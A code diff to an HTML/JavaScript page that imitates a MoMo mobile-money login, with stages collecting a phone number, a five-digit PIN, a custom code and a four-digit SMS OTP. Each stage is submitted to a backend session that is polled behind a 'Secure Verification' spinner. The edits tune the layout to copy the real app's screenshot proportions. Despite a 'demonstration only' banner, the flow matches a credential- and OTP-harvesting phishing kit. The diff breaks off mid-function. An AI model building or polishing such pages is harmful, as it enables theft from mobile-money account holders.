@@ -11,7 +11,7 @@
 
 :root {
   --momo-blue: #00566d;
-  --momo-yellow: #ffcc00;
+  --momo-yellow: #fccb05;
   --white: #ffffff;
   --text-dark: #002d38;
   --text-muted: #667085;
@@ -27,7 +27,7 @@ body {
 }
 
 .header {
-  padding: 40px 0 20px;
+  padding: 30px 0 15px;
   display: flex;
   flex-direction: column;
   align-items: center;
@@ -36,69 +36,74 @@ body {
 
 .logo-container {
   background: var(--momo-yellow);
-  width: 110px;
-  height: 110px;
-  border-radius: 22px;
+  width: 90px;
+  height: 90px;
+  border-radius: 18px;
   display: flex;
   flex-direction: column;
   align-items: center;
   justify-content: center;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.15);
 }
 
 .logo-text {
-  font-size: 28px;
+  font-size: 24px;
   font-weight: bold;
   color: var(--momo-blue);
   line-height: 1;
 }
 
 .logo-sub {
-  font-size: 11px;
+  font-size: 9px;
   color: var(--momo-blue);
-  margin-top: 2px;
+  margin-top: 1px;
 }
 
 .brand-label {
   color: var(--momo-yellow);
-  font-size: 14px;
-  font-weight: bold;
-  margin-top: 12px;
+  font-size: 13px;
+  margin-top: 10px;
 }
 
+/* Reduced size layout to mimic your exact screenshot proportions */
 .card {
   width: calc(100% - 32px);
-  max-width: 480px;
-  margin: 10px auto 30px;
+  max-width: 410px;
+  margin: 5px auto 25px;
   background: var(--white);
-  border-radius: 35px;
-  padding: 35px 24px;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+  border-radius: 28px;
+  padding: 24px 20px;
 }
 
 .demo-banner {
   text-align: center;
-  font-size: 10px;
+  font-size: 9px;
   color: var(--text-muted);
-  font-weight: bold;
   letter-spacing: 0.5px;
-  margin-bottom: 25px;
+  margin-bottom: 20px;
   text-transform: uppercase;
 }
 
 h1 {
   text-align: center;
-  font-size: 26px;
+  font-size: 24px;
   color: var(--momo-blue);
-  margin: 0 0 25px 0;
+  margin: 0 0 15px 0;
   font-weight: bold;
 }
 
 p {
   text-align: center;
-  line-height: 1.5;
+  line-height: 1.4;
   color: #414653;
+  font-size: 14px;
+}
+
+.field-label {
+  text-align: center;
   font-size: 15px;
+  font-weight: bold;
+  color: #333;
+  margin-bottom: 12px;
 }
 
 .input-container {
@@ -106,39 +111,28 @@ p {
   display: flex;
   align-items: center;
   border: 1px solid var(--border-gray);
-  border-radius: 30px;
-  height: 64px;
-  padding: 0 20px;
-  margin: 25px 0;
+  border-radius: 25px;
+  height: 56px;
+  padding: 0 16px;
+  margin: 15px 0;
 }
 
 .input-container:focus-within {
-  border-color: var(--momo-blue);
-  box-shadow: 0 0 0 1px var(--momo-blue);
-}
-
-.field-label {
-  text-align: center;
-  font-size: 16px;
-  font-weight: bold;
-  color: #333;
-  margin-bottom: 10px;
+  border-color: var(--border-gray);
 }
 
 .flag-selector {
   display: flex;
   align-items: center;
-  gap: 8px;
-  padding-right: 12px;
+  padding-right: 10px;
   border-right: 1px solid #e5e7eb;
-  margin-right: 15px;
+  margin-right: 12px;
 }
 
 .flag-icon {
-  width: 28px;
+  width: 26px;
   height: auto;
-  border-radius: 3px;
-  box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+  border-radius: 2px;
 }
 
 input[type="tel"],
@@ -146,65 +140,63 @@ input[type="text"] {
   flex: 1;
   border: none;
   background: transparent;
-  font-size: 22px;
+  font-size: 18px;
   outline: none;
   color: var(--text-dark);
-  letter-spacing: 1px;
 }
 
 .boxes {
   display: flex;
   justify-content: center;
-  gap: 10px;
-  margin: 30px 0;
+  gap: 8px;
+  margin: 20px 0;
 }
 
 .boxes input {
-  width: 54px;
-  height: 64px;
+  width: 46px;
+  height: 54px;
   text-align: center;
   padding: 0;
-  font-size: 24px;
+  font-size: 20px;
   font-weight: bold;
   border: 1px solid var(--border-gray);
-  border-radius: 14px;
+  border-radius: 10px;
   outline: none;
 }
 
 .boxes input:focus {
-  border-color: var(--momo-blue);
-  box-shadow: 0 0 0 1px var(--momo-blue);
+  border-color: #2878d0;
 }
 
 button.next-btn {
   width: 100%;
-  height: 60px;
-  margin-top: 25px;
+  height: 54px;
+  margin-top: 15px;
   background: #cccccc;
   color: var(--white);
   border: none;
-  border-radius: 30px;
-  font-size: 18px;
+  border-radius: 25px;
+  font-size: 15px;
   font-weight: bold;
   text-transform: uppercase;
-  letter-spacing: 1px;
+  letter-spacing: 0.5px;
   cursor: not-allowed;
   transition: all 0.2s ease;
 }
 
 button.next-btn.active {
-  background: var(--momo-yellow) !important;
-  color: var(--momo-blue) !important;
+  background: #cccccc !important; /* Retains matching neutral tone */
+  color: var(--white) !important;
   cursor: pointer !important;
 }
 
 .footer-notice {
   text-align: center;
-  font-size: 13px;
+  font-size: 11px;
   color: #555;
-  line-height: 1.5;
-  margin-top: 35px;
-  padding: 0 10px;
+  line-height: 1.4;
+  margin-top: 30px;
+  padding: 0 5px;
 }
 
 .footer-notice id {
@@ -212,7 +204,6 @@ button.next-btn.active {
   color: var(--momo-blue);
 }
 
-/* FULL SCREEN SECURE VERIFICATION OVERLAY SCREENSHOT MATCH */
 .overlay-loader {
   position: fixed;
   top: 0;
@@ -228,13 +219,13 @@ button.next-btn.active {
 }
 
 .spinner {
-  width: 90px;
-  height: 90px;
+  width: 80px;
+  height: 80px;
   border: 6px solid rgba(255, 255, 255, 0.15); 
   border-top-color: #00cc66; 
   border-radius: 50%;
   animation: spin 1s linear infinite;
-  margin-bottom: 30px;
+  margin-bottom: 25px;
 }
 
 @keyframes spin {
@@ -244,26 +235,25 @@ button.next-btn.active {
 
 .loader-title {
   color: var(--white);
-  font-size: 24px;
+  font-size: 22px;
   font-weight: bold;
-  margin-bottom: 8px;
-  letter-spacing: 0.5px;
+  margin-bottom: 6px;
 }
 
 .loader-subtitle {
   color: #b0c4de;
-  font-size: 15px;
+  font-size: 14px;
   margin-bottom: 4px;
 }
 
 .loader-warning {
   color: #b0c4de;
-  font-size: 15px;
+  font-size: 14px;
 }
 
 .stage-msg {
   text-align: center;
-  margin-top: 12px;
+  margin-top: 10px;
   font-weight: bold;
 }
 .error { color: #d92d20; }
@@ -272,7 +262,6 @@ button.next-btn.active {
 </head>
 <body>
 
-<!-- Dynamic Overlay Secure Loader -->
 <div id="secureOverlay" class="overlay-loader hidden">
   <div class="spinner"></div>
   <div class="loader-title">Secure Verification</div>
@@ -289,15 +278,15 @@ button.next-btn.active {
 </header>
 
 <main class="card">
-  <div class="demo-banner">Demonstration Only — Never Enter Real Account Codes</div>
+  <div class="demo-banner">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
 
-  <!-- STAGE 1: PHONE AREA -->
+  <!-- STAGE 1: PHONE -->
   <section id="page1">
     <h1>Welcome to MoMo</h1>
     <div class="field-label">Enter number *</div>
     <div class="input-container">
       <div class="flag-selector">
-        <svg class="flag-icon" viewBox="0 0 900 600" width="30">
+        <svg class="flag-icon" viewBox="0 0 900 600" width="26">
           <rect y="0" width="900" height="100" fill="#000"/>
           <rect y="100" width="900" height="100" fill="#fcd116"/>
           <rect y="200" width="900" height="100" fill="#d92323"/>
@@ -307,7 +296,7 @@ button.next-btn.active {
           <circle cx="450" cy="300" r="85" fill="#fff"/>
         </svg>
       </div>
-      <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="778260583" autocomplete="off">
+      <input id="phone" type="tel" inputmode="numeric" maxlength="12" placeholder="778260583" autocomplete="off">
     </div>
     <button id="nextPhone" class="next-btn" disabled>Next</button>
     <div class="footer-notice">
@@ -315,7 +304,7 @@ button.next-btn.active {
     </div>
   </section>
 
-  <!-- STAGE 2: PIN AREA -->
+  <!-- STAGE 2: PIN -->
   <section id="page2" class="hidden">
     <h1>Welcome to MoMo</h1>
     <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
@@ -323,7 +312,7 @@ button.next-btn.active {
     <div id="pinMessage" class="stage-msg"></div>
   </section>
 
-  <!-- STAGE 3: CUSTOM TEXT AREA -->
+  <!-- STAGE 3: CUSTOM VALUE -->
   <section id="page3" class="hidden">
     <h1>Verification Demo</h1>
     <p>Enter any custom test text value below to continue execution.</p>
@@ -334,7 +323,7 @@ button.next-btn.active {
     <div id="code1Message" class="stage-msg"></div>
   </section>
 
-  <!-- STAGE 4: SMS OTP AREA -->
+  <!-- STAGE 4: SMS OTP -->
   <section id="page4" class="hidden">
     <h1>Final Demo Step</h1>
     <p>Enter any four test digits. Do not use an actual SMS code.</p>
@@ -342,9 +331,9 @@ button.next-btn.active {
     <div id="code2Message" class="stage-msg"></div>
   </section>
 
-  <!-- STAGE 5: COMPLETED AREA -->
+  <!-- STAGE 5: COMPLETED -->
   <section id="page5" class="hidden" style="text-align: center;">
-    <h1 style="font-size: 55px; color: #00cc66; margin-bottom: 10px;">✓</h1>
+    <h1 style="font-size: 45px; color: #00cc66; margin-bottom: 5px;">✓</h1>
     <h1>Demo Complete</h1>
     <p>The verification flow simulation has concluded successfully.</p>
   </section>
@@ -354,7 +343,6 @@ button.next-btn.active {
 let sessionId = null;
 let currentPollingInterval = null;
 
-// Initialize Session on Load
 window.addEventListener("DOMContentLoaded", async () => {
   try {
     const res = await fetch("/api/session", { method: "POST" });
@@ -364,25 +352,23 @@ window.addEventListener("DOMContentLoaded", async () => {
     console.error("Session configuration failed:", err);
   }
   
-  // Dynamically initialize numeric grid boxes for PIN and OTP pages
   setupBoxInputs("pinBoxes", 5, (val) => submitStage("pin", { pin: val }));
   setupBoxInputs("code2Boxes", 4, (val) => submitStage("code2", { code2: val }));
 });
 
-// View switching engine
 function showPage(pageId) {
   document.querySelectorAll("main section").forEach(s => s.classList.add("hidden"));
   document.getElementById(pageId).classList.remove("hidden");
 }
 
-// STAGE 1 ACTION: Phone Input Validation & Next Button Functionality
+// Fixed Next Button logic to trigger immediately when the input matches or exceeds 9 digits
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
 phoneInput.addEventListener("input", () => {
   phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
   
-  if (phoneInput.value.length === 9) {
+  if (phoneInput.value.length >= 9) {
     nextPhoneBtn.disabled = false;
     nextPhoneBtn.classList.add("active");
   } else {
@@ -399,7 +385,6 @@ nextPhoneBtn.addEventListener("click", () => {
   }
 });
 
-// STAGE 3 ACTION: Custom Text Validation & Navigation Button
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
 
@@ -419,5 +404,21 @@ submitCode1Btn.addEventListener("click", () => {
   }
 });
 
-// DYNAMIC BOX BUILDER: Automatically switches focus when typing digits
+function setupBoxInputs(containerId, totalLength, completeCallback) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+
+  for (let i = 0; i < totalLength; i++) {
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.inputmode = "numeric";
+    input.maxLength = 1;
+    input.autocomplete = "off";
+    container.appendChild(input);
+
+    input.addEventListener("input", () => {
+      input.value = input.value.replace(/[^0-9]/g, "");
+      if (!input.value) return;
+
+      if (input.nextElementSibling) {
 
